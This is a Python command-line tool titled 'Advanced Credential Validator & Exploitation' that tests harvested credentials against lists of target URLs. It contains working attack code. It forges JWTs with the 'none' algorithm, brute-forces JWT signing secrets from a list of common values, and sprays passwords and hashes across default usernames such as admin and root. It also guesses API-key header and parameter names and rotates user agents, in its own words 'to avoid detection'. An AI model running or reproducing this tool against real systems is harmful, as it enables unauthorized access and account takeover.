import requests
import base64
import re
import json
import time
import random
import concurrent.futures
import argparse
import sys
import os
import hmac
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored output
init()

# Disable SSL warnings for testing
requests.packages.urllib3.disable_warnings()

class AdvancedCredentialValidator:
    def __init__(self, urls_file=None, verbose=False, max_workers=10, output_dir=None, timeout=10):
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.output_dir = output_dir or os.path.join(base_dir, "Reports")
        self.urls = self.load_urls(urls_file) if urls_file else []
        self.verbose = verbose
        self.max_workers = max_workers
        self.output_dir = output_dir
        self.timeout = timeout
        self.results = {
            "valid": 0,
            "invalid": 0,
            "total": 0,
            "valid_credentials": []  # Will store details about valid credentials
        }
        
        # Common JWT signing secrets to try
        self.jwt_common_secrets = [
            "secret", "SECRET", "secret123", "Secret123", "private", "key", "password", 
            "1234567890", "qwertyuiop", "admin", "test", "dev", "development", "staging",
            "production", "jwt_secret", "jwt_token", "jwt_key", "api_secret", "app_secret",
            "auth_secret", "auth_key", "signature_key", "api_key", "apikey", "token"
        ]
        
        # Create output directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
    
    def load_urls(self, urls_file):
        """Load URLs from a text file"""
        try:
            with open(urls_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED}Error loading URLs file: {str(e)}{Style.RESET_ALL}")
            return []
    
    def log(self, message, level="INFO"):
        """Log message if verbose mode is enabled"""
        if self.verbose:
            color = Fore.GREEN if "✅" in message else Fore.RED if "❌" in message else Fore.YELLOW if "⚠️" in message else Fore.BLUE
            print(f"{color}[{level}] {message}{Style.RESET_ALL}")
    
    def get_random_user_agent(self):
        """Return a random user agent to avoid detection"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1"
        ]
        return random.choice(user_agents)

    def validate_basic_auth(self, auth_string):
        """Test Basic Authentication credentials against all URLs"""
        self.results["total"] += 1
        valid_urls = []
        
        # Check if already Base64 encoded
        try:
            decoded = base64.b64decode(auth_string).decode('utf-8')
            if ':' not in decoded:
                self.log(f"Basic Auth format invalid: {auth_string}", "ERROR")
                self.results["invalid"] += 1
                return False
            
            # Extract username and password
            username, password = decoded.split(':', 1)
            
        except Exception as e:
            # If not Base64 encoded, try to use as is if it contains a colon
            if ':' in auth_string:
                username, password = auth_string.split(':', 1)
                decoded = auth_string
                # Encode for the Auth header
                auth_string = base64.b64encode(auth_string.encode('utf-8')).decode('utf-8')
            else:
                self.log(f"Not a valid Basic Auth string: {auth_string} - {str(e)}", "ERROR")
                self.results["invalid"] += 1
                return False
        
        # Test the credentials against all URLs
        for url in self.urls:
            headers = {
                "Authorization": f"Basic {auth_string}",
                "User-Agent": self.get_random_user_agent()
            }
            
            try:
                response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                
                # Check for success (non-401/403 response could indicate valid auth)
                if response.status_code < 400:
                    valid_urls.append({
                        "url": url,
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "title": self.extract_title(response.text) if 'text/html' in response.headers.get('Content-Type', '') else None
                    })
                    self.log(f"✅ Valid Basic Auth at {url}: {username}:******* (Status: {response.status_code})", "SUCCESS")
            except Exception as e:
                self.log(f"❌ Error testing Basic Auth at {url}: {str(e)}", "ERROR")
        
        # If we found any valid URLs, consider the credential valid
        if valid_urls:
            self.results["valid"] += 1
            self.results["valid_credentials"].append({
                "type": "basic_auth",
                "value": auth_string,
                "decoded": decoded,
                "username": username,
                "password": password,
                "valid_urls": valid_urls
            })
            return True
        else:
            self.results["invalid"] += 1
            return False
    
    def validate_bearer_token(self, token):
        """Test Bearer token against all URLs"""
        self.results["total"] += 1
        valid_urls = []
        
        for url in self.urls:
            headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": self.get_random_user_agent()
            }
            
            try:
                response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                
                if response.status_code < 400:
                    valid_urls.append({
                        "url": url,
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "title": self.extract_title(response.text) if 'text/html' in response.headers.get('Content-Type', '') else None
                    })
                    self.log(f"✅ Valid Bearer Token at {url}: {token[:10]}... (Status: {response.status_code})", "SUCCESS")
            except Exception as e:
                self.log(f"❌ Error testing Bearer Token at {url}: {str(e)}", "ERROR")
        
        if valid_urls:
            self.results["valid"] += 1
            self.results["valid_credentials"].append({
                "type": "bearer_token",
                "value": token,
                "valid_urls": valid_urls
            })
            return True
        else:
            self.results["invalid"] += 1
            return False
    
    def decode_jwt_parts(self, token):
        """Decode JWT parts without verification"""
        parts = token.split('.')
        if len(parts) != 3:
            return None, None, None
        
        try:
            # Decode header
            header_padding = '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(parts[0] + header_padding).decode('utf-8'))
            
            # Decode payload
            payload_padding = '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + payload_padding).decode('utf-8'))
            
            # Signature part (raw)
            signature = parts[2]
            
            return header, payload, signature
        except Exception as e:
            self.log(f"⚠️ Error decoding JWT: {str(e)}", "WARNING")
            return None, None, None
    
    def test_jwt_none_algorithm(self, token, url):
        """Test if server accepts 'none' algorithm bypass"""
        header, payload, _ = self.decode_jwt_parts(token)
        if not header or not payload:
            return False
        
        # Create a new token with 'none' algorithm
        header['alg'] = 'none'
        
        # Encode header and payload
        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        # Various forms of the 'none' attack
        none_variations = [
            f"{encoded_header}.{encoded_payload}.",
            f"{encoded_header}.{encoded_payload}",
            f"{encoded_header}.{encoded_payload}.none",
            f"{encoded_header}.{encoded_payload}.NULL"
        ]
        
        for none_token in none_variations:
            try:
                headers = {
                    "Authorization": f"Bearer {none_token}",
                    "User-Agent": self.get_random_user_agent()
                }
                
                response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                
                if response.status_code < 400:
                    self.log(f"⚠️ JWT 'none' algorithm vulnerability at {url} with token: {none_token[:15]}...", "VULNERABILITY")
                    return {
                        "url": url,
                        "status_code": response.status_code,
                        "vulnerable_token": none_token,
                        "vulnerability": "jwt_none_algorithm",
                        "original_token": token
                    }
            except Exception as e:
                self.log(f"❌ Error testing JWT 'none' algorithm at {url}: {str(e)}", "ERROR")
        
        return False
    
    def brute_force_jwt_secret(self, token, url):
        """Attempt to brute-force JWT secret using common values"""
        header, payload, signature = self.decode_jwt_parts(token)
        if not header or not payload:
            return False
        
        # Get the algorithm
        alg = header.get('alg', '')
        if not alg.startswith('HS'):
            # Only test HMAC-based algorithms (HS256, HS384, HS512)
            return False
        
        # Get the hash algorithm based on JWT alg
        hash_alg = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }.get(alg)
        
        if not hash_alg:
            return False
        
        # Test common secrets
        message = f"{token.split('.')[0]}.{token.split('.')[1]}"
        
        for secret in self.jwt_common_secrets:
            try:
                computed_signature = base64.urlsafe_b64encode(
                    hmac.new(
                        secret.encode(),
                        message.encode(),
                        hash_alg
                    ).digest()
                ).decode().rstrip('=')
                
                # Check if signatures match
                if computed_signature == signature:
                    self.log(f"✅ Found JWT secret: '{secret}' for token: {token[:15]}...", "SUCCESS")
                    
                    # Try to use the token with the found secret
                    headers = {
                        "Authorization": f"Bearer {token}",
                        "User-Agent": self.get_random_user_agent()
                    }
                    
                    try:
                        response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                        status = response.status_code
                    except:
                        status = "Error"
                    
                    return {
                        "url": url,
                        "found_secret": secret,
                        "status_code": status,
                        "token": token,
                        "algorithm": alg
                    }
            except Exception as e:
                self.log(f"⚠️ Error testing JWT secret '{secret}': {str(e)}", "WARNING")
        
        return False
    
    def validate_jwt(self, token):
        """Validate JWT token structure and test against all URLs with security tests"""
        self.results["total"] += 1
        
        # Check JWT format
        parts = token.split('.')
        if len(parts) != 3:
            self.log(f"❌ Not a valid JWT format: {token[:10]}...", "ERROR")
            self.results["invalid"] += 1
            return False
        
        valid_urls = []
        security_findings = []
        
        try:
            # Try to decode the payload
            header, payload, _ = self.decode_jwt_parts(token)
            
            if header and payload:
                # Check expiration
                if 'exp' in payload and payload['exp'] < time.time():
                    self.log(f"⚠️ JWT is expired: {token[:10]}... ({time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(payload['exp']))})", "WARNING")
                
                # Extract claims for reporting
                issuer = payload.get('iss', 'Unknown')
                subject = payload.get('sub', 'Unknown')
                audience = payload.get('aud', 'Unknown')
                expiration = payload.get('exp', 'None')
                if expiration and expiration != 'None':
                    expiration = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expiration))
                
                # Extract algorithm
                algorithm = header.get('alg', 'Unknown')
                
                # Log JWT details
                self.log(f"JWT Info: Alg={algorithm}, Issuer={issuer}, Subject={subject}, Expiration={expiration}", "INFO")
            else:
                self.log(f"⚠️ Could not decode JWT parts for: {token[:10]}...", "WARNING")
        except Exception as e:
            self.log(f"⚠️ Warning: Could not decode JWT payload: {str(e)}", "WARNING")
        
        # Test JWT against all URLs
        for url in self.urls:
            # Basic test as Bearer token
            headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": self.get_random_user_agent()
            }
            
            try:
                response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                
                if response.status_code < 400:
                    valid_urls.append({
                        "url": url,
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "title": self.extract_title(response.text) if 'text/html' in response.headers.get('Content-Type', '') else None
                    })
                    self.log(f"✅ Valid JWT at {url}: {token[:10]}... (Status: {response.status_code})", "SUCCESS")
                    
                    # If token is valid, test security issues
                    
                    # Test 'none' algorithm vulnerability
                    none_result = self.test_jwt_none_algorithm(token, url)
                    if none_result:
                        security_findings.append(none_result)
                    
                    # Try to brute-force the secret
                    secret_result = self.brute_force_jwt_secret(token, url)
                    if secret_result:
                        security_findings.append(secret_result)
                        
            except Exception as e:
                self.log(f"❌ Error testing JWT at {url}: {str(e)}", "ERROR")
        
        if valid_urls:
            self.results["valid"] += 1
            
            # Prepare JWT info for results
            jwt_info = {
                "type": "jwt_token",
                "value": token,
                "valid_urls": valid_urls,
                "security_findings": security_findings
            }
            
            # Add decoded information if available
            if header and payload:
                jwt_info.update({
                    "header": header,
                    "payload": payload,
                    "algorithm": algorithm,
                    "issuer": issuer,
                    "subject": subject,
                    "audience": audience,
                    "expiration": expiration
                })
            
            self.results["valid_credentials"].append(jwt_info)
            return True
        else:
            self.results["invalid"] += 1
            return False
    
    def extract_title(self, html_content):
        """Extract title from HTML content"""
        match = re.search(r'<title>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else None
    
    def validate_api_key(self, api_key):
        """Test API Key with different header names against all URLs"""
        self.results["total"] += 1
        valid_results = []
        
        # Common API key header names to try
        header_names = [
            "X-API-Key", 
            "api-key", 
            "apikey", 
            "x-api-token", 
            "Authorization",  # Some use "Authorization: ApiKey xxx"
            "x-auth-token",
            "api_key",
            "key",
            "token",
            "secret",
            "x-auth",
            "x-token",
            "auth",
            "Authentication"
        ]
        
        # Also try variations with the API key
        auth_prefixes = ["", "ApiKey ", "Token ", "Key ", "APIKEY ", "Bearer "]
        
        # Try query parameter
        query_params = ["api_key", "apiKey", "key", "token", "access_token", "auth", "auth_token", "api-key", "api-token"]
        
        for url in self.urls:
            # Try with different header names and variations
            for header_name in header_names:
                for prefix in auth_prefixes:
                    headers = {
                        header_name: f"{prefix}{api_key}",
                        "User-Agent": self.get_random_user_agent()
                    }
                    
                    try:
                        response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                        if response.status_code < 400:
                            valid_results.append({
                                "url": url,
                                "method": "header",
                                "header_name": header_name,
                                "prefix": prefix,
                                "status_code": response.status_code,
                                "content_length": len(response.content),
                                "title": self.extract_title(response.text) if 'text/html' in response.headers.get('Content-Type', '') else None
                            })
                            self.log(f"✅ Valid API Key at {url} with header {header_name}{' and prefix ' + prefix if prefix else ''}: {api_key[:5]}... (Status: {response.status_code})", "SUCCESS")
                    except Exception as e:
                        self.log(f"❌ Error testing API Key at {url} with header {header_name}: {str(e)}", "ERROR")
            
            # Try with query parameters
            for param in query_params:
                # Parse URL to add query parameter
                parsed_url = urlparse(url)
                query_dict = parse_qs(parsed_url.query)
                query_dict[param] = [api_key]
                
                # Rebuild URL with added parameter
                new_query = urlencode(query_dict, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                try:
                    response = requests.get(
                        new_url, 
                        headers={"User-Agent": self.get_random_user_agent()}, 
                        verify=False, 
                        timeout=self.timeout
                    )
                    if response.status_code < 400:
                        valid_results.append({
                            "url": url,
                            "method": "query_param",
                            "param_name": param,
                            "status_code": response.status_code,
                            "content_length": len(response.content),
                            "title": self.extract_title(response.text) if 'text/html' in response.headers.get('Content-Type', '') else None
                        })
                        self.log(f"✅ Valid API Key at {url} with query param {param}: {api_key[:5]}... (Status: {response.status_code})", "SUCCESS")
                except Exception as e:
                    self.log(f"❌ Error testing API Key at {url} with query param {param}: {str(e)}", "ERROR")
        
        if valid_results:
            self.results["valid"] += 1
            self.results["valid_credentials"].append({
                "type": "api_key",
                "value": api_key,
                "valid_locations": valid_results
            })
            return True
        else:
            self.results["invalid"] += 1
            return False
    
    def validate_hash(self, hash_string):
        """Validate hash format"""
        self.results["total"] += 1
        
        hash_type = None
        
        if re.match(r'^[a-fA-F0-9]{32}$', hash_string):
            hash_type = "MD5"
            self.log(f"✅ Valid MD5 hash format: {hash_string}", "INFO")
        elif re.match(r'^[a-fA-F0-9]{40}$', hash_string):
            hash_type = "SHA1"
            self.log(f"✅ Valid SHA1 hash format: {hash_string}", "INFO")
        elif re.match(r'^[a-fA-F0-9]{64}$', hash_string):
            hash_type = "SHA256"
            self.log(f"✅ Valid SHA256 hash format: {hash_string}", "INFO")
        elif re.match(r'^[a-fA-F0-9]{96}$', hash_string):
            hash_type = "SHA384"
            self.log(f"✅ Valid SHA384 hash format: {hash_string}", "INFO")
        elif re.match(r'^[a-fA-F0-9]{128}$', hash_string):
            hash_type = "SHA512"
            self.log(f"✅ Valid SHA512 hash format: {hash_string}", "INFO")
        else:
            self.log(f"❌ Unknown hash format: {hash_string}", "ERROR")
            self.results["invalid"] += 1
            return "Unknown"
        
        # Store hash information
        self.results["valid"] += 1
        self.results["valid_credentials"].append({
            "type": f"{hash_type.lower()}_hash",
            "value": hash_string,
            "format": hash_type
        })
        
        # Try hash as password with common usernames
        common_usernames = ["admin", "root", "user", "test", "demo", "administrator"]
        
        if len(self.urls) > 0:
            print(f"\n{Fore.YELLOW}⚠️ Warning: Hash {hash_string} could be a password. Testing with common usernames...{Style.RESET_ALL}")
            
            for username in common_usernames:
                auth_string = f"{username}:{hash_string}"
                encoded_auth = base64.b64encode(auth_string.encode()).decode()
                
                for url in self.urls:
                    headers = {
                        "Authorization": f"Basic {encoded_auth}",
                        "User-Agent": self.get_random_user_agent()
                    }
                    
                    try:
                        response = requests.get(url, headers=headers, verify=False, timeout=self.timeout)
                        
                        if response.status_code < 400:
                            print(f"{Fore.GREEN}✅ Hash successfully used as password with username '{username}' at {url}{Style.RESET_ALL}")
                            
                            self.results["valid_credentials"].append({
                                "type": "password_hash",
                                "hash": hash_string,
                                "username": username,
                                "url": url,
                                "status_code": response.status_code
                            })
                            break
                    except:
                        pass
        
        return hash_type
    
    def validate_password(self, password, username=None):
        """Validate password (with optional username)"""
        self.results["total"] += 1
        
        # Store the password
        self.results["valid_credentials"].append({
            "type": "password",
            "value": password,
            "username": username
        })
        self.results["valid"] += 1
        
        # If username is provided, try Basic Auth
        if username and self.urls:
            auth_string = f"{username}:{password}"
            encoded_auth = base64.b64encode(auth_string.encode()).decode()
            
            return self.validate_basic_auth(encoded_auth)
        
        # If no username, try common usernames
        elif self.urls:
            common_usernames = ["admin", "root", "user", "test", "demo", "administrator", "guest"]
            print(f"\n{Fore.YELLOW}⚠️ Warning: No username provided for password. Testing with common usernames...{Style.RESET_ALL}")
            
            for username in common_usernames:
                auth_string = f"{username}:{password}"
                encoded_auth = base64.b64encode(auth_string.encode()).decode()
                
                if self.validate_basic_auth(encoded_auth):
                    return True
            
            return False
        else:
            return True  # No URLs to test against
    
    def process_credential(self, cred_type, value, username=None):
        """Process a single credential based on its type"""
        if cred_type == 'authorization_basic':
            return self.validate_basic_auth(value)
        elif cred_type in ['authorization_bearer', 'oauth_token', 'access_token']:
            return self.validate_bearer_token(value)
        elif cred_type == 'jwt_token':
            return self.validate_jwt(value)
        elif cred_type == 'api_key' or cred_type == 'authorization_api':
            return self.validate_api_key(value)
        elif cred_type in ['md5_hash', 'sha1_hash', 'sha256_hash', 'sha384_hash', 'sha512_hash']:
            return self.validate_hash(value)
        elif cred_type == 'password':
            return self.validate_password(value, username)
        elif cred_type == 'possible_creds':
            # Try to guess the credential type
            if re.match(r'^[a-fA-F0-9]{32,128}$', value):
                return self.validate_hash(value)
            elif '.' in value and len(value.split('.')) == 3:
                return self.validate_jwt(value)
            else:
                # Try as API key
                return self.validate_api_key(value)
        else:
            self.log(f"⚠️ Unknown credential type: {cred_type}", "WARNING")
            return None
    
    def validate_single_credential(self, cred_type, value, username=None):
        """Validate a single credential provided directly by the user"""
        print(f"\n{Fore.BLUE}Testing a single {cred_type} credential...{Style.RESET_ALL}")
        
        if self.process_credential(cred_type, value, username):
            print(f"{Fore.GREEN}✅ Credential validated successfully!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ Credential validation failed.{Style.RESET_ALL}")
        
        # Save results
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        results_file = os.path.join(self.output_dir, f"single_validation_{timestamp}.json")
        
        with open(results_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\nResults saved to: {results_file}")
    
    def validate_credentials_file(self, filepath, specific_type=None):
        """Process a file with extracted credentials using parallel processing"""
        print(f"\n{Fore.BLUE}Testing credentials against {len(self.urls)} URLs...{Style.RESET_ALL}")
        
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
        except json.JSONDecodeError:
            print(f"{Fore.RED}Error: {filepath} is not a valid JSON file.{Style.RESET_ALL}")
            return
        except FileNotFoundError:
            print(f"{Fore.RED}Error: File {filepath} not found.{Style.RESET_ALL}")
            return
        
        # Process credentials in parallel with ThreadPoolExecutor
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for cred_type, values in data.items():
                # Skip if empty or if filtering by type
                if not values or (specific_type and cred_type != specific_type):
                    continue
                
                print(f"\n{Fore.BLUE}--- Testing {len(values)} {cred_type} credentials ---{Style.RESET_ALL}")
                
                # Submit tasks to the executor
                for value in values:
                    username = None
                    # Check if it's a dict with username and password
                    if isinstance(value, dict) and 'username' in value and 'password' in value:
                        username = value['username']
                        value = value['password']
                    
                    futures.append(executor.submit(self.process_credential, cred_type, value, username))
            
            # Wait for all tasks to complete with progress tracking
            completed = 0
            total = len(futures)

            for future in concurrent.futures.as_completed(futures):
                completed += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}Progress: {completed}/{total} ({int(completed/total*100)}%){Style.RESET_ALL}")


                # We don't need to store the result, as it's already stored in self.results
                try:
                    future.result()
                except Exception as e:
                    print(f"{Fore.RED}Error in task: {str(e)}{Style.RESET_ALL}")

                # Save results to file
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                results_file = os.path.join(self.output_dir, f"validation_results_{timestamp}.json")

                with open(results_file, 'w') as f:
                    json.dump(self.results, f, indent=2)

                print(f"\n{Fore.GREEN}Results summary:{Style.RESET_ALL}")
                print(f"  - Total credentials tested: {self.results['total']}")
                print(f"  - Valid credentials found: {self.results['valid']}")
                print(f"  - Invalid credentials: {self.results['invalid']}")
                print(f"\nDetailed results saved to: {results_file}")

def main():
    """Main function to parse arguments and execute the tool"""
    parser = argparse.ArgumentParser(
        description="Advanced Credential Validator & Exploitation - Test credentials against multiple URLs"
    )
    
    # Input options
    input_group = parser.add_argument_group('Input Options')
    input_group.add_argument('-c', '--credential', help="Test a single credential")
    input_group.add_argument('-t', '--type', help="Credential type (basic_auth, bearer_token, jwt_token, api_key, password, hash)")
    input_group.add_argument('-u', '--username', help="Username for password testing")
    input_group.add_argument('-f', '--file', help="JSON file with extracted credentials")
    input_group.add_argument('-s', '--specific-type', help="Process only specific credential type from file")
    
    # URL options
    url_group = parser.add_argument_group('URL Options')
    url_group.add_argument('-U', '--urls-file', required=True, help="File containing target URLs (one per line)")
    
    # Execution options
    exec_group = parser.add_argument_group('Execution Options')
    exec_group.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output")
    exec_group.add_argument('-w', '--workers', type=int, default=10, help="Number of concurrent workers (default: 10)")
    exec_group.add_argument('-o', '--output-dir', default="results", help="Directory to save results (default: results)")
    exec_group.add_argument('--timeout', type=int, default=10, help="Request timeout in seconds (default: 10)")
    
    args = parser.parse_args()
    
    # Initialize the validator
    validator = AdvancedCredentialValidator(
        urls_file=args.urls_file,
        verbose=args.verbose,
        max_workers=args.workers,
        output_dir=args.output_dir,
        timeout=args.timeout
    )
    
    # Check if we have URLs to test against
    if not validator.urls:
        print(f"{Fore.RED}Error: No URLs loaded. Please check your URLs file.{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}Loaded {len(validator.urls)} URLs for testing.{Style.RESET_ALL}")
    
    # Process either a single credential or a file
    if args.credential:
        if not args.type:
            print(f"{Fore.RED}Error: Credential type (-t/--type) is required when testing a single credential.{Style.RESET_ALL}")
            sys.exit(1)
        
        validator.validate_single_credential(args.type, args.credential, args.username)
    
    elif args.file:
        validator.validate_credentials_file(args.file, args.specific_type)
    
    else:
        print(f"{Fore.RED}Error: Either a credential (-c/--credential) or a file (-f/--file) must be provided.{Style.RESET_ALL}")
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Process interrupted by user. Exiting...{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}An unexpected error occurred: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
